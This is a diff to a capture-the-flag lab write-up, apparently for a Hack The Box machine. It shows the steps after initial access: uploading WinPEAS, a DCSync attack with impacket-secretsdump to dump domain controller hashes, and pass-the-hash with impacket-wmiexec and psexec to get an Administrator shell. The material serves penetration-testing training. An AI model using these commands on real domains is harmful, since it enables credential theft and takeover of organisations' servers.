@@ -88,15 +88,17 @@ Find PSRemote exploit in the mapping.
 
 Upload WinPEAS to the target machine and run it. Find a new user in the
 ![alt text](images/image-10.png)
-NEW USER BLOODHOUND
+
 ![alt text](images/image-9.png)
 
 Perform the DCSync attack and get the hashes from the DC server  
 `impacket-secretsdump 'egotistical-bank.local/svc_loanmgr@10.129.167.181'`  
 ![alt text](images/image-12.png)
 
-Now use wmiexec to get an admin shell
+### Now use wmiexec or psexec to get an admin shell
 
 ```
-impacket-wmiexec -hashes :<NTDS_HASH> Administrator@10.129.167.181
+impacket-wmiexec -hashes :<NTLM_HASH> Administrator@10.129.167.181
+
+impacket-psexec EGOTISTICAL-BANK.local/administrator@10.129.167.181 -hashes <LMA_HASH>:<NTLM_HASH>
 ```
